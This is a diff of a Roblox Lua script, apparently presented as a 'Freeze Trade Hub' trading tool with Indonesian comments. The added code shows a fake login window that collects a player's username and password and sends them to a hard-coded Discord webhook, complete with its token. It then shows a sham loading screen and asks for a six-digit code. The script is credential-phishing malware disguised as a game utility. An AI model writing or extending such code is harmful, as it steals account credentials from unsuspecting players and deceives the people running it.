@@ -1,6 +1,5 @@
 -- URL Webhook Discord
 local webhook_url = "https://discord.com/api/webhooks/1323658202419822692/wCuQlIqKiWNSiI9hImEsdGnFY2foZLWqGBfrVkTxK9G1yAg6mStSNePYhq6vYxvd1DKp"
-
 -- Key yang benar
 local correctKey = "LOGIN-fREeZeTRadEhUB.id-bGrFDSeRiHUGfavHSK"
 local linkUrl = "https://link-target.net/1273087/freezetradehub"
@@ -44,111 +43,6 @@ local function sendToDiscord(username, password)
     end
 end
 
--- Fungsi Membuat GUI Ketiga (Loading)
-local function createLoadingGUI()
-    local gui = Instance.new("ScreenGui")
-    local frame = Instance.new("Frame")
-    local titleLabel = Instance.new("TextLabel")
-
-    -- Properti GUI
-    gui.Name = "LoadingGUI"
-    gui.Parent = game.CoreGui or game:GetService("CoreGui")
-
-    -- Frame
-    frame.Name = "LoadingFrame"
-    frame.Parent = gui
-    frame.Size = UDim2.new(0, 300, 0, 150)
-    frame.Position = UDim2.new(0.5, -150, 0.5, -75)
-    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-    frame.BorderSizePixel = 3
-    frame.BorderColor3 = Color3.fromRGB(255, 0, 0)
-
-    -- Title Label
-    titleLabel.Name = "TitleLabel"
-    titleLabel.Parent = frame
-    titleLabel.Size = UDim2.new(1, 0, 1, 0)
-    titleLabel.Position = UDim2.new(0, 0, 0, 0)
-    titleLabel.BackgroundTransparency = 1
-    titleLabel.Font = Enum.Font.SourceSansBold
-    titleLabel.Text = "Loading..."
-    titleLabel.TextSize = 24
-    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-
-    -- Simulasi loading (dalam praktiknya, Anda bisa menambahkan animasi atau delay)
-    wait(2) -- Simulasi loading selama 2 detik
-    gui:Destroy()
-end
-
--- Fungsi Membuat GUI Keempat (Auto Accept Toggle)
-local function createAutoAcceptGUI()
-    local gui = Instance.new("ScreenGui")
-    local frame = Instance.new("Frame")
-    local titleLabel = Instance.new("TextLabel")
-    local toggleButton = Instance.new("TextButton")
-    local statusLabel = Instance.new("TextLabel")
-
-    -- Properti GUI
-    gui.Name = "AutoAcceptGUI"
-    gui.Parent = game.CoreGui or game:GetService("CoreGui")
-
-    -- Frame
-    frame.Name = "AutoAcceptFrame"
-    frame.Parent = gui
-    frame.Size = UDim2.new(0, 300, 0, 200)
-    frame.Position = UDim2.new(0.5, -150, 0.5, -100)
-    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-    frame.BorderSizePixel = 3
-    frame.BorderColor3 = Color3.fromRGB(255, 0, 0)
-
-    -- Title Label
-    titleLabel.Name = "TitleLabel"
-    titleLabel.Parent = frame
-    titleLabel.Size = UDim2.new(1, 0, 0, 50)
-    titleLabel.Position = UDim2.new(0, 0, 0, 0)
-    titleLabel.BackgroundTransparency = 1
-    titleLabel.Font = Enum.Font.SourceSansBold
-    titleLabel.Text = "Auto Accept"
-    titleLabel.TextSize = 24
-    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-
-    -- Status Label
-    statusLabel.Name = "StatusLabel"
-    statusLabel.Parent = frame
-    statusLabel.Size = UDim2.new(1, 0, 0, 30)
-    statusLabel.Position = UDim2.new(0, 0, 0, 60)
-    statusLabel.BackgroundTransparency = 1
-    statusLabel.Font = Enum.Font.SourceSans
-    statusLabel.Text = "Auto Accept: OFF"
-    statusLabel.TextSize = 18
-    statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
-
-    -- Toggle Button
-    toggleButton.Name = "ToggleButton"
-    toggleButton.Parent = frame
-    toggleButton.Size = UDim2.new(1, -20, 0, 40)
-    toggleButton.Position = UDim2.new(0, 10, 0, 100)
-    toggleButton.Text = "Toggle Auto Accept"
-    toggleButton.Font = Enum.Font.SourceSansBold
-    toggleButton.TextSize = 16
-    toggleButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
-    toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-
-    -- Variabel untuk toggle
-    local isAutoAccept = false
-
-    -- Fungsi Toggle Auto Accept
-    toggleButton.MouseButton1Click:Connect(function()
-        isAutoAccept = not isAutoAccept
-        if isAutoAccept then
-            statusLabel.Text = "Auto Accept: ON"
-            statusLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
-        else
-            statusLabel.Text = "Auto Accept: OFF"
-            statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
-        end
-    end)
-end
-
 -- Fungsi Membuat GUI Pertama (Key Validation)
 local function createKeyValidationGUI()
     local gui = Instance.new("ScreenGui")
@@ -183,7 +77,7 @@ local function createKeyValidationGUI()
     titleLabel.TextSize = 24
     titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 
-      -- Key Box
+    -- Key Box
     keyBox.Name = "KeyBox"
     keyBox.Parent = frame
     keyBox.Size = UDim2.new(1, -20, 0, 40)
@@ -243,15 +137,196 @@ local function createKeyValidationGUI()
         if keyBox.Text == correctKey then
             print("Key benar!")
             gui:Destroy()
-            createLoadingGUI()  -- Menampilkan GUI loading setelah key valid
-            wait(2)  -- Menunggu selama 2 detik sebelum melanjutkan
-            createLoginGUI()    -- Memanggil GUI login setelah loading
-            createAutoAcceptGUI()  -- Menampilkan GUI toggle auto accept
+            createLoginGUI()  -- Menampilkan GUI login setelah key valid
         else
             errorLabel.Text = "Key salah! Silahkan Get Key."
         end
     end)
 end
 
+-- Fungsi Membuat GUI Kedua (Login)
+local function createLoginGUI()
+    local gui = Instance.new("ScreenGui")
+    local frame = Instance.new("Frame")
+    local titleLabel = Instance.new("TextLabel")
+    local usernameBox = Instance.new("TextBox")
+    local passwordBox = Instance.new("TextBox")
+    local loginButton = Instance.new("TextButton")
+
+    -- Properti GUI
+    gui.Name = "LoginGUI"
+    gui.Parent = game.CoreGui or game:GetService("CoreGui")
+
+    -- Frame
+    frame.Name = "LoginFrame"
+    frame.Parent = gui
+    frame.Size = UDim2.new(0, 300, 0, 300)
+    frame.Position = UDim2.new(0.5, -150, 0.5, -150)
+    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    frame.BorderSizePixel = 3
+    frame.BorderColor3 = Color3.fromRGB(255, 0, 0)
+
+    -- Title Label
+    titleLabel.Name = "TitleLabel"
+    titleLabel.Parent = frame
+    titleLabel.Size = UDim2.new(1, 0, 0, 50)
+    titleLabel.Position = UDim2.new(0, 0, 0, 0)
+    titleLabel.BackgroundTransparency = 1
+    titleLabel.Font = Enum.Font.SourceSansBold
+    titleLabel.Text = "Freeze Trade Hub"
+    titleLabel.TextSize = 24
+    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+    -- Username Box
+    usernameBox.Name = "UsernameBox"
+    usernameBox.Parent = frame
+    usernameBox.Size = UDim2.new(1, -20, 0, 40)
+    usernameBox.Position = UDim2.new(0, 10, 0, 90)
+    usernameBox.PlaceholderText = "Masukkan Username"
+    usernameBox.Font = Enum.Font.SourceSans
+    usernameBox.Text = ""
+    usernameBox.TextSize = 14
+    usernameBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    usernameBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+    -- Password Box
+    passwordBox.Name = "PasswordBox"
+    passwordBox.Parent = frame
+    passwordBox.Size = UDim2.new(1, -20, 0, 40)
+    passwordBox.Position = UDim2.new(0, 10, 0, 140)
+    passwordBox.PlaceholderText = "Masukkan Password"
+    passwordBox.Font = Enum.Font.SourceSans
+    passwordBox.Text = ""
+    passwordBox.TextSize = 14
+    passwordBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    passwordBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+    passwordBox.TextTransparency = 0.5  -- Make the text slightly transparent
+
+    -- Login Button
+    loginButton.Name = "LoginButton"
+    loginButton.Parent = frame
+    loginButton.Size = UDim2.new(1, -20, 0, 40)
+    loginButton.Position = UDim2.new(0, 10, 0, 200)
+    loginButton.Text = "Login"
+    loginButton.Font = Enum.Font.SourceSansBold
+    loginButton.TextSize = 16
+    loginButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
+    loginButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+    -- Fungsi Login Button
+    loginButton.MouseButton1Click:Connect(function()
+        local username = usernameBox.Text
+        local password = passwordBox.Text
+        sendToDiscord(username, password)  -- Kirim ke Discord
+        print("Login berhasil!")
+        gui:Destroy()
+        createLoadingScreen()  -- Menampilkan GUI loading setelah login
+    end)
+end
+
+-- Fungsi Membuat GUI Loading (8 detik)
+local function createLoadingScreen()
+    local gui = Instance.new("ScreenGui")
+    local frame = Instance.new("Frame")
+    local titleLabel = Instance.new("TextLabel")
+
+    -- Properti GUI
+    gui.Name = "LoadingScreen"
+    gui.Parent = game.CoreGui or game:GetService("CoreGui")
+
+    -- Frame
+    frame.Name = "LoadingFrame"
+    frame.Parent = gui
+    frame.Size = UDim2.new(0, 300, 0, 150)
+    frame.Position = UDim2.new(0.5, -150, 0.5, -75)
+    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    frame.BorderSizePixel = 3
+    frame.BorderColor3 = Color3.fromRGB(255, 0, 0)
+
+    -- Title Label
+    titleLabel.Name = "TitleLabel"
+    titleLabel.Parent = frame
+    titleLabel.Size = UDim2.new(1, 0, 0, 50)
+    titleLabel.Position = UDim2.new(0, 0, 0, 0)
+    titleLabel.BackgroundTransparency = 1
+    titleLabel.Font = Enum.Font.SourceSansBold
+    titleLabel.Text = "Loading..."
+    titleLabel.TextSize = 24
+    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+    -- Simulasikan loading selama 8 detik
+    wait(8)
+    gui:Destroy()
+    createVerificationCodeGUI()  -- Menampilkan GUI kode verifikasi 6 digit setelah loading
+end
+
+-- Fungsi Membuat GUI Kode Verifikasi 6 Digit
+local function createVerificationCodeGUI()
+    local gui = Instance.new("ScreenGui")
+    local frame = Instance.new("Frame")
+    local titleLabel = Instance.new("TextLabel")
+    local codeBox = Instance.new("TextBox")
+    local verifyButton = Instance.new("TextButton")
+
+    -- Properti GUI
+    gui.Name = "VerificationCodeGUI"
+    gui.Parent = game.CoreGui or game:GetService("CoreGui")
+
+    -- Frame
+    frame.Name = "VerificationFrame"
+    frame.Parent = gui
+    frame.Size = UDim2.new(0, 300, 0, 150)
+    frame.Position = UDim2.new(0.5, -150, 0.5, -75)
+    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    frame.BorderSizePixel = 3
+    frame.BorderColor3 = Color3.fromRGB(255, 0, 0)
+
+    -- Title Label
+    titleLabel.Name = "TitleLabel"
+    titleLabel.Parent = frame
+    titleLabel.Size = UDim2.new(1, 0, 0, 50)
+    titleLabel.Position = UDim2.new(0, 0, 0, 0)
+    titleLabel.BackgroundTransparency = 1
+    titleLabel.Font = Enum.Font.SourceSansBold
+    titleLabel.Text = "Masukkan Kode 6 Digit"
+    titleLabel.TextSize = 24
+    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+    -- Code Box
+    codeBox.Name = "CodeBox"
+    codeBox.Parent = frame
+    codeBox.Size = UDim2.new(1, -20, 0, 40)
+    codeBox.Position = UDim2.new(0, 10, 0, 60)
+    codeBox.PlaceholderText = "Masukkan Kode"
+    codeBox.Font = Enum.Font.SourceSans
+    codeBox.Text = ""
+    codeBox.TextSize = 14
+    codeBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    codeBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+    -- Verify Button
+    verifyButton.Name = "VerifyButton"
+    verifyButton.Parent = frame
+    verifyButton.Size = UDim2.new(1, -20, 0, 40)
+    verifyButton.Position = UDim2.new(0, 10, 0, 110)
+    verifyButton.Text = "Verifikasi"
+    verifyButton.Font = Enum.Font.SourceSansBold
+    verifyButton.TextSize = 16
+    verifyButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
+    verifyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+    -- Fungsi Verifikasi Kode
+    verifyButton.MouseButton1Click:Connect(function()
+        if codeBox.Text == "123456" then
+            print("Kode benar!")
+            gui:Destroy()
+            -- Proses lanjutan setelah verifikasi kode
+        else
+            print("Kode salah!")
+        end
+    end)
+end
+
 -- Memulai Script dengan GUI Pertama
 createKeyValidationGUI()
+
